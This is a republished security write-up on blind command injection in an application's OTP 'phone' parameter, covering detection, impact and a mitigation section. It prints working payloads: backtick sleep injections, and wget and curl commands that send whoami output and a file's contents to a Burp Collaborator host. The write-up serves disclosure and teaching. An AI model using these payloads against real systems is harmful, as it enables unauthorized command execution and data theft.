# :game_die: The Art of Blind Command Injection: Unlocking Internal Secrets 🎩

> **Original Source:** [The Art of Blind Command Injection: Unlocking Internal Secrets 🎩](https://infosecwriteups.com/the-art-of-blind-command-injection-unlocking-internal-secrets-917daa755463)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# The Art of Blind Command Injection: Unlocking Internal Secrets 🎩


*Hello folks!! This is my first write-up, and I hope you all enjoy it. Let’s dive in!*

>

*Blind Command Injection:*


Blind Command Injection is a vulnerability where an attacker can execute system commands on a server without directly seeing the output. It occurs when user inputs are not properly sanitized, allowing malicious commands to be passed to the server’s shell. Since the output isn’t displayed to the attacker, they rely on side effects (like delays or HTTP/DNS callbacks) to confirm exploitation.


Summary of the vulnerability:


Application’s generate OTP functionality was found to be vulnerable to command injection. By injecting the payload “ ``sleep 10` `", the application delayed its response by 10 seconds. This behavior was further confirmed by using the " `sleep 20 `", which resulted in a 20-second delay. To escalate the vulnerability severity, I crafted a payload to execute commands like " `ls `" and redirected the output to a Collaborator server.


Exploitation:


Starting from the start, I navigated to the “Generate OTP” functionality, entered a mobile number, and observed the following API request. From the response, I identified that the server is running Nginx on Ubuntu.


After attempting to find multiple vulnerabilities I finally injected “ ``sleep 20` `" into the `phone `parameter, causing the application to delay its response by 20 seconds.


To verify if the server was executing commands, I used the payload “ `wget burp_collaborator_server `". Shortly after, I successfully received an HTTP request on the collaborator server, confirming that the server was indeed executing the commands.


Since this is a blind vulnerability and the output was not visible in the response, I crafted a `curl `command:
`curl -X POST -d "$(whoami)" burp_collaborator_server `.
This payload executes the `whoami `command on the server and sends its output to our collaborator server.


Next, I executed the `ls`command, and the output was successfully received on the collaborator server.


In the output, I found a file named “.php”. To escalate impact of the attack, I crafted the following payload:
`curl -X POST -d "$(cat .php)" burp_collaborator_server `.
This command executes `cat `on the ".php" file and sends its contents to the collaborator server. As a result, I was able to retrieve the content of the ".php" file, which contained the source code of the application.


## Get Yogesh Bhandage’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Note: The “.php” was not contain any sensitive information. I might can access more information but it is not ethical. so I immediately approached the client to fix this vulnerability/


Note: While it was possible to access more data, I refrained as it would be unethical. Instead, I promptly reported the vulnerability to the client to ensure it was addressed.


Impact:


Exploitation of this vulnerability allowed me to perform arbitrary command execution on the server, enabling complete control over its operations. By leveraging this flaw, I was able to execute Create, Read, Update, and Delete (CRUD) operations on server files. This included accessing sensitive information, such as application source code, which could lead to further exploitation. An attacker could manipulate critical server data, compromise system integrity, exfiltrate confidential information, and potentially escalate to a full system takeover.


Recommended mitigation of this vulnerability:


Since this vulnerability exists in the `phone`parameter, it is recommended to implement proper server-side validation for all input fields. Specifically, as the parameter is intended to accept phone numbers, the server should be configured to allow only numeric values and reject any special characters or non-numeric inputs.


Stay vigilant, and happy hacking! 🎩


My LinkedIn Profile — [https://www.linkedin.com/in/yogesh-bhandage/](https://www.linkedin.com/in/yogesh-bhandage/)

---

*Originally published on [Medium](https://infosecwriteups.com/the-art-of-blind-command-injection-unlocking-internal-secrets-917daa755463). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
